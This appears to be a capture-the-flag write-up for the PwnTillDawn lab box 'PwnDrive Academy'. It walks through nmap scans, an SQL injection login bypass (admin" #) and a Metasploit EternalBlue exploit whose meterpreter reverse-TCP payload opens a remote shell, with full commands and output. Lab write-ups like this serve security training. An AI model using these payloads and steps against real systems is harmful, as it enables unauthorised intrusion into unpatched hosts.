---

title: "PwnDrive Academy - 10.150.150.11"
date: 2022-04-21 01:09:33 +0300
author: oste
image: /assets/img/Posts/pwndriveacademy.png
categories: [PwnTillDawn, PTD-EASY]
tags: [metasploit, CVE-2017-0143, smb-vuln-ms17-010, EternalBlue]
---

We first begin by performing an nmap scan to determine what ports are open and what services are running behind them.

```bash
➜  nmap -sC -sV -T4 10.150.150.11
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-12 16:05 EDT
Nmap scan report for 10.150.150.11 (10.150.150.11)
Host is up (0.16s latency).
Not shown: 985 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Xlight ftpd 3.9
80/tcp    open  http               Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
|_http-title: PwnDrive - Your Personal Online Storage
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
443/tcp   open  ssl/http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| tls-alpn:
|_  http/1.1
|_http-title: Bad request!
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds       Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.2100.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-08-24T13:11:13
|_Not valid after:  2050-08-24T13:11:13
|_ssl-date: 2022-04-12T21:02:54+00:00; +45m38s from scanner time.
| ms-sql-ntlm-info:
|   Target_Name: PWNDRIVE
|   NetBIOS_Domain_Name: PWNDRIVE
|   NetBIOS_Computer_Name: PWNDRIVE
|   DNS_Domain_Name: PwnDrive
|   DNS_Computer_Name: PwnDrive
|_  Product_Version: 6.1.7601
3306/tcp  open  mysql              MySQL 5.5.5-10.4.14-MariaDB
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info:
|   Target_Name: PWNDRIVE
|   NetBIOS_Domain_Name: PWNDRIVE
|   NetBIOS_Computer_Name: PWNDRIVE
|   DNS_Domain_Name: PwnDrive
|   DNS_Computer_Name: PwnDrive
|   Product_Version: 6.1.7601
|_  System_Time: 2022-04-12T21:01:36+00:00
|_ssl-date: 2022-04-12T21:02:41+00:00; +45m37s from scanner time.
| ssl-cert: Subject: commonName=PwnDrive
| Not valid before: 2022-04-11T21:02:14
|_Not valid after:  2022-10-11T21:02:14
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info:
|   10.150.150.11:1433:
|     Version:
|       name: Microsoft SQL Server 2012 RTM
|       number: 11.00.2100.00
|       Product: Microsoft SQL Server 2012
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: PWNDRIVE, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:89:87:cb (VMware)
| smb-os-discovery:
|   OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1 (Windows Server 2008 R2 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   NetBIOS computer name: PWNDRIVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-04-12T14:00:10-07:00
|_clock-skew: mean: 1h45m38s, deviation: 2h38m45s, median: 45m37s
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-04-12T21:00:45
|_  start_date: 2020-08-24T13:11:20
```

We have Apache running on port 80 & 443. Looking at the site running, we get:

![image](https://user-images.githubusercontent.com/58165365/164459464-abd38ff2-9d3d-4082-8ffa-f81343737307.png)

There's nothing much going on here but we do see a **Sign in** button. Clicking on it, we get a login screen. Trying some default credentials didn't work. So i decided to use some [SQL Injection Authentication Payloads](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/) from PentestLab.

Loging in with the username and password as : `admin" #` worked and we get access as an administrator

![image](https://user-images.githubusercontent.com/58165365/164450992-d9845b56-6ce6-4020-89dd-3baaf32497a1.png)

Browsing around, we find potential usernames.

![image](https://user-images.githubusercontent.com/58165365/164451816-a5fa87c2-1c1e-4b44-a581-4db83b1fb7a1.png)

There is a file upload functionality but that didn't work out well for me.(_If you managed to get a shell using this method, fire me a DM on twitter😉_). Moving on, we also have port 445 open. So i decide to test if the machine was vulnerable to [EternalBlue (smb-vuln-ms17-010)](https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html). You can do so using nmap's scripting engine (NSE) using any of the commands listed below:

```bash
nmap -p445 --script vuln xx.xx.xx.xx
nmap -p445 --script smb-vuln-ms17-010 xx.xx.xx.xx
```

In our case, we see the machine is VULNERABLE!

```bash
➜  nmap -p445 --script smb-vuln-ms17-010 10.150.150.11
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-21 08:34 EDT
Nmap scan report for 10.150.150.11
Host is up (0.16s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 4.08 seconds
```

Good o' Metasploit has a module that can exploit this vulnerability. You can read more abou the same in [rapid7's blog](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/).

```bash
msf6 > search eternal

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 tar
                                             get machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
                                             machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.24     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.150.150.11
RHOSTS => 10.150.150.11
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.66.67.174:4444
[*] 10.150.150.11:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.150.150.11:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] 10.150.150.11:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.150.150.11:445 - The target is vulnerable.
[*] 10.150.150.11:445 - Connecting to target for exploitation.
[+] 10.150.150.11:445 - Connection established for exploitation.
[+] 10.150.150.11:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.150.150.11:445 - CORE raw buffer dump (53 bytes)
[*] 10.150.150.11:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 10.150.150.11:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris
[*] 10.150.150.11:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P
[*] 10.150.150.11:445 - 0x00000030  61 63 6b 20 31                                   ack 1
[+] 10.150.150.11:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.150.150.11:445 - Trying exploit with 12 Groom Allocations.
[*] 10.150.150.11:445 - Sending all but last fragment of exploit packet
[*] 10.150.150.11:445 - Starting non-paged pool grooming
[+] 10.150.150.11:445 - Sending SMBv2 buffers
[+] 10.150.150.11:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.150.150.11:445 - Sending final SMBv2 buffers.
[*] 10.150.150.11:445 - Sending last fragment of exploit packet!
[*] 10.150.150.11:445 - Receiving response from exploit packet
[+] 10.150.150.11:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.150.150.11:445 - Sending egg to corrupted connection.
[*] 10.150.150.11:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.150.150.11
[*] Meterpreter session 2 opened (10.66.67.174:4444 -> 10.150.150.11:52184 ) at 2022-04-21 08:16:47 -0400
[+] 10.150.150.11:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.150.150.11:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.150.150.11:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > shell
Process 3580 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
```

After setting the required options , we get a shell. Looking around, we see we have several users on the system. Looking around the Administrator's Desktop Dir, we get the flag.

```bash
C:\Windows\system32>cd ..\..\Users
cd ..\..\Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F80A-FDD9

 Directory of C:\Users

07/16/2020  06:44 AM    <DIR>          .
07/16/2020  06:44 AM    <DIR>          ..
06/27/2016  12:21 AM    <DIR>          Administrator
06/27/2016  02:05 AM    <DIR>          Classic .NET AppPool
03/28/2020  09:01 AM    <DIR>          Jboden
06/27/2016  01:58 AM    <DIR>          MSSQL$SQLEXPRESS
07/13/2009  09:57 PM    <DIR>          Public
07/16/2020  06:44 AM    <DIR>          tony
               0 File(s)              0 bytes
               8 Dir(s)  25,281,761,280 bytes free
C:\Users\tony>cd Administrator
cd Administrator
C:\Users\Administrator>dir Desktop
dir Desktop
 Volume in drive C has no label.
 Volume Serial Number is F80A-FDD9

 Directory of C:\Users\Administrator\Desktop

11/17/2020  07:19 AM    <DIR>          .
11/17/2020  07:19 AM    <DIR>          ..
11/17/2020  07:20 AM                30 FLAG1.txt
08/11/2020  08:29 AM               979 Xlight FTP Server.lnk
               2 File(s)          1,009 bytes
               2 Dir(s)  25,281,695,744 bytes free
```

That's it for this box. It was preety easy to exploit and get the flag. Special shout out to the team behind the PTD network:

- [https://www.wizlynxgroup.com/](https://www.wizlynxgroup.com/)
- [https://online.pwntilldawn.com/](https://online.pwntilldawn.com/)
